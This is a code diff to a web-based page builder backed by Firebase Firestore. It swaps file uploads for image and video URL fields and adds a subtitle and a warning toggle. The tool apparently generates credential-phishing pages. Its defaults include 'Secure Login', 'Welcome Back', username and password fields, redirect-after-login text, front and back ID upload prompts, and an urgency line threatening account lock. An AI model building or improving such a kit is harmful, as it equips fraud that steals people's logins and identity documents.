@@ -6,7 +6,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
   <style>
     body { font-family: sans-serif; background: #f0f2f5; padding: 20px; }
     .container { max-width: 900px; margin: auto; background: #fff; padding: 20px; border-radius: 10px; }
@@ -25,31 +24,37 @@
 <body>
 <div class="container">
   <h2>🎨 Form Builder</h2>
+  <p style="font-size:14px;color:gray;">
+    Use this form to build custom pages quickly. Paste URLs for images instead of uploading files.
+  </p>
 
   <!-- Inputs -->
   <label>SEO Page Title</label><input id="seoTitle" placeholder="Secure Login">
   <label>Meta Description</label><textarea id="metaDesc" placeholder="Enter the page meta description"></textarea>
   <label>OG Image URL</label><input id="ogImage" placeholder="https://example.com/image.jpg">
+
+  <!-- Avatar + Logo + Titles -->
+  <label>Avatar Image URL</label><input id="avatarURL" placeholder="https://example.com/avatar.jpg">
+  <label>Logo Image URL</label><input id="logoURL" placeholder="https://example.com/logo.png">
   <label>Page Title</label><input id="title" placeholder="Welcome Back">
   <label>Title Color</label><input type="color" id="titleColor">
+  <label>Page Subtitle</label><input id="subtitle" placeholder="Your subtitle here">
+  <label>Subtitle Color</label><input type="color" id="subtitleColor" value="#555555">
 
-  <!-- Uploads -->
-  <label>Avatar</label><input type="file" id="avatarUpload">
-  <div class="avatar-preview"><img id="avatarPreview" style="display:none;"></div>
-  <label>Banner Image</label><input type="file" id="bannerFile">
-  <label>Logo Image</label><input type="file" id="logoFile">
-  <label>Upload up to 7 Images</label><input type="file" id="multiImageUpload" multiple accept="image/*">
-  <label>Upload Videos</label><input type="file" id="videoUpload" multiple accept="video/*">
-  <div class="media-grid" id="mediaPreview"></div>
+  <!-- Other Media -->
+  <label>Banner Image URL</label><input id="bannerURL" placeholder="https://example.com/banner.jpg">
+  <label>Gallery Images (comma separated URLs)</label><textarea id="galleryImages" placeholder="https://img1.jpg, https://img2.jpg"></textarea>
+  <label>Videos (comma separated URLs)</label><textarea id="videoLinks" placeholder="https://video1.mp4, https://video2.mp4"></textarea>
 
   <!-- Background -->
   <label>Background Image URL</label><input id="bgImageURL" placeholder="https://example.com/bg.jpg">
   <label>Background Size</label><input id="bgWidth" placeholder="100%"><input id="bgHeight" placeholder="auto">
 
-  <!-- Text -->
-  <label>Description</label><textarea id="description" placeholder="Enter your description"></textarea>
-  <label>Warning Message</label><textarea id="warning" placeholder="Do not share your login details"></textarea>
+  <!-- Warning Message -->
+  <label><input type="checkbox" id="enableWarning" checked> Warning Message</label>
+  <textarea id="warning">⚠️ Failure to verify may result in account lock!</textarea>
   <label>Warning Color</label><input type="color" id="warningColor">
+  <label>Description</label><textarea id="description" placeholder="Enter your description"></textarea>
 
   <!-- Auth & Redirect -->
   <label><input type="checkbox" id="addAuth"> Include Username & Password</label>
@@ -57,8 +62,7 @@
   <input id="passwordPlaceholder" placeholder="Password">
   <label><input type="checkbox" id="useRedirect"> Enable Redirect Link</label>
   <input id="redirectLink" placeholder="https://example.com/redirect">
-  <label>Redirect Description</label>
-  <input id="redirectDesc" placeholder="You’ll be redirected after login.">
+  <label>Redirect Description</label><input id="redirectDesc" placeholder="You’ll be redirected after login.">
 
   <!-- ID & Extra -->
   <label>Front ID Description</label><input id="frontDesc" placeholder="Upload front ID">
@@ -130,11 +134,8 @@
   };
   firebase.initializeApp(firebaseConfig);
   const db = firebase.firestore();
-  const storage = firebase.storage();
-
   const $ = id => document.getElementById(id);
-  let fields = [], avatarURL = "", bannerURL = "", logoURL = "";
-  let imageGallery = [], videoGallery = [];
+  let fields = [];
 
   function getButtonIcon(icon) {
     switch (icon) {
@@ -166,20 +167,35 @@
     });
   }
 
-  function uploadMedia(file, folder) {
-    return storage.ref(`${folder}/${Date.now()}_${file.name}`).put(file)
-      .then(snap => snap.ref.getDownloadURL());
-  }
-
   function buildPreview() {
     const get = id => $(id).value;
+    const galleryImages = get("galleryImages").split(",").map(i => i.trim()).filter(Boolean);
+    const videoLinks = get("videoLinks").split(",").map(i => i.trim()).filter(Boolean);
+
     const htmlParts = [`<div style="background:${get("bgColor")};color:${get("textColor")};padding:20px;border-radius:10px;background-image:url('${get("bgImageURL")}');background-size:${get("bgWidth")} ${get("bgHeight")}">`];
-    if (get("title")) htmlParts.push(`<h2 style="text-align:center;color:${get("titleColor")}">${get("title")}</h2>`);
-    if (avatarURL) htmlParts.push(`<div style="text-align:center;"><img src="${avatarURL}" style="width:120px;border-radius:50%;border:2px solid #ccc;"></div>`);
-    if (bannerURL) htmlParts.push(`<img src="${bannerURL}" style="width:100%;margin:10px 0;border-radius:8px;">`);
-    if (logoURL) htmlParts.push(`<img src="${logoURL}" style="width:100px;height:auto;display:block;margin:auto;">`);
+
+    // Avatar -> Logo -> Title -> Subtitle
+    if (get("avatarURL")) {
+      htmlParts.push(`<div style="text-align:center;">
+                        <img src="${get("avatarURL")}" style="width:120px;border-radius:50%;border:2px solid #ccc;">
+                      </div>`);
+    }
+    if (get("logoURL")) {
+      htmlParts.push(`<img src="${get("logoURL")}" style="width:100px;height:auto;display:block;margin:10px auto;">`);
+    }
+    if (get("title")) {
+      htmlParts.push(`<h2 style="text-align:center;color:${get("titleColor")}">${get("title")}</h2>`);
+    }
+    if (get("subtitle")) {
+      htmlParts.push(`<h4 style="text-align:center;color:${get("subtitleColor")};font-weight:normal;">${get("subtitle")}</h4>`);
+    }
+
+    if (get("bannerURL")) htmlParts.push(`<img src="${get("bannerURL")}" style="width:100%;margin:10px 0;border-radius:8px;">`);
     if (get("description")) htmlParts.push(`<p style="text-align:center;">${get("description")}</p>`);
-    if (get("warning")) htmlParts.push(`<p style="color:${get("warningColor")};text-align:center;font-weight:bold;">${get("warning")}</p>`);
+    if ($("enableWarning").checked && get("warning")) {
+      htmlParts.push(`<p style="color:${get("warningColor")};text-align:center;font-weight:bold;">${get("warning")}</p>`);
+    }
+
     htmlParts.push("<form>");
     if ($("addAuth").checked) {
       htmlParts.push(`<input placeholder="${get("usernamePlaceholder")}"><br><input placeholder="${get("passwordPlaceholder")}" type="password"><br>`);
@@ -194,10 +210,11 @@
     if (get("footerText")) htmlParts.push(`<p style="text-align:center;">${get("footerText")}</p>`);
     if ($("useRedirect").checked && get("redirectDesc")) htmlParts.push(`<p style="text-align:center;color:gray;">${get("redirectDesc")}</p>`);
     htmlParts.push("</form>");
-    if (imageGallery.length || videoGallery.length) {
+
+    if (galleryImages.length || videoLinks.length) {
       htmlParts.push(`<div class="media-grid">`);
-      imageGallery.forEach(url => htmlParts.push(`<img src="${url}" />`));
-      videoGallery.forEach(url => htmlParts.push(`<video controls src="${url}"></video>`));
+      galleryImages.forEach(url => htmlParts.push(`<img src="${url}" />`));
+      videoLinks.forEach(url => htmlParts.push(`<video controls src="${url}"></video>`));
       htmlParts.push(`</div>`);
     }
     htmlParts.push("</div>");
@@ -211,6 +228,8 @@
       metaDesc: get("metaDesc"),
       ogImage: get("ogImage"),
       title: get("title"),
+      subtitle: get("subtitle"),
+      subtitleColor: get("subtitleColor"),
       titleColor: get("titleColor"),
       description: get("description"),
       warning: get("warning"),
@@ -238,8 +257,11 @@
       btnIcon: get("btnIcon"),
       hoverEffect: get("hoverEffect"),
       btnPosition: get("btnPosition"),
-      avatarURL, bannerURL, logoURL,
-      imageGallery, videoGallery,
+      avatarURL: get("avatarURL"),
+      bannerURL: get("bannerURL"),
+      logoURL: get("logoURL"),
+      imageGallery: get("galleryImages").split(",").map(i => i.trim()).filter(Boolean),
+      videoGallery: get("videoLinks").split(",").map(i => i.trim()).filter(Boolean),
       fields,
       createdAt: new Date().toISOString()
     }).then(docRef => {
@@ -250,13 +272,15 @@
   }
 
   const inputs = [
-    "seoTitle", "metaDesc", "ogImage", "title", "titleColor", "description", "warning", "warningColor",
-    "usernamePlaceholder", "passwordPlaceholder", "redirectLink", "redirectDesc", "frontDesc", "backDesc",
-    "extraDesc", "extraDescColor", "extraFields", "textColor", "bgColor", "bgImageURL", "bgWidth",
-    "bgHeight", "btnColor", "buttonText", "footerText", "btnStyle", "btnIcon", "hoverEffect", "btnPosition"
+    "seoTitle", "metaDesc", "ogImage", "title", "subtitle", "subtitleColor", "titleColor", "avatarURL", "logoURL", 
+    "bannerURL", "galleryImages", "videoLinks", "description", "warning", "warningColor", "usernamePlaceholder", 
+    "passwordPlaceholder", "redirectLink", "redirectDesc", "frontDesc", "backDesc", "extraDesc", 
+    "extraDescColor", "extraFields", "textColor", "bgColor", "bgImageURL", "bgWidth", "bgHeight", 
+    "btnColor", "buttonText", "footerText", "btnStyle", "btnIcon", "hoverEffect", "btnPosition"
   ];
   inputs.forEach(id => $(id).addEventListener("input", buildPreview));
   $("addAuth").addEventListener("change", buildPreview);
+  $("enableWarning").addEventListener("change", buildPreview);
   buildPreview();
 </script>
 </body>
